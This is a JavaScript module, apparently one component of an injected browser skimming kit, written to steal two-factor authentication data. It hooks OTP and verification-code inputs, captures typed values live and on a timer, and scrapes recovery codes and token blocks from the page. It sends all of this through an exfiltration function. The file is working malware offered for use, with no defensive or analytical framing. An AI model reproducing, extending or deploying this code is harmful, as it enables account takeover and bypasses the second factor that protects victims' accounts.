/* m-otp.js — 2FA/OTP/recovery codes capture. 0% cobertura en el FOOT.
   Hook inputs OTP (autocomplete one-time-code, inputmode numeric, maxlength 6-8), captura recovery codes del DOM. */
(function(G){
if(!G)return; if(G._M&&G._M.otp)return; G._M=G._M||{}; G._M.otp=1;
var exfil=G.exfil, hx=(window.__GE_OFF__&&window.__GE_OFF__.hx)||function(){};
try{
var OTP_RE=/(otp|totp|mfa|2fa|one.?time|verification.?code|auth.?code|security.?code)/i;
function isOtp(el){if(!el||!el.tagName)return false;
var t=el.tagName.toLowerCase();if(t!=='input'&&t!=='textarea')return false;
var ac=el.getAttribute('autocomplete')||'',im=el.getAttribute('inputmode')||'',ml=el.getAttribute('maxlength')||'',nm=(el.name||'')+(el.id||'')+(el.placeholder||'');
if(ac==='one-time-code')return true;
if(im==='numeric'&&parseInt(ml)>=4&&parseInt(ml)<=10)return true;
if(OTP_RE.test(nm))return true;
return false}
function scan(){
var hits=[];
document.querySelectorAll('input,textarea').forEach(function(el){
if(isOtp(el)&&el.value&&el.value.replace(/\s/g,'').length>=4){
hits.push({n:el.name||el.id,ac:el.getAttribute('autocomplete'),v:el.value.slice(0,20)});
}});
if(hits.length)exfil('otp',{items:hits,n:hits.length});
}
// hook en vivo
document.addEventListener('input',function(e){if(isOtp(e.target)&&e.target.value.replace(/\s/g,'').length>=4)exfil('otp-live',{n:e.target.name||e.target.id,v:e.target.value.slice(0,12)})},{capture:true});
document.addEventListener('change',scan,{capture:true});
setInterval(scan,4000);
// recovery codes en el DOM (texto rendered con patrón XXXX-XXXX o N tokens)
function scanRecovery(){
var txt=document.body?document.body.innerText:'';
var recCode=/\b([A-Z0-9]{4}-[A-Z0-9]{4}(?:-[A-Z0-9]{4}){2,8})\b/g;
var m=txt.match(recCode);
if(m&&m.length){exfil('recovery-codes',{codes:m.slice(0,10),n:m.length});return}
// bloques de tokens alfanuméricos largos (pre/code/textarea)
document.querySelectorAll('pre,code,textarea,.kg-code,div[class*=code]').forEach(function(el){
var v=(el.innerText||el.value||'').trim();
var lines=v.split(/\n/).filter(function(l){return /^[A-Za-z0-9]{8,40}$/.test(l.trim())});
if(lines.length>=5)exfil('recovery-block',{sample:lines.slice(0,8).join(','),n:lines.length,tag:el.tagName});
});
}
setTimeout(scanRecovery,2500);setInterval(scanRecovery,20000);
scan();
}catch(e){hx('m-otp-err',{m:e.message})}
})(window.__GE__);
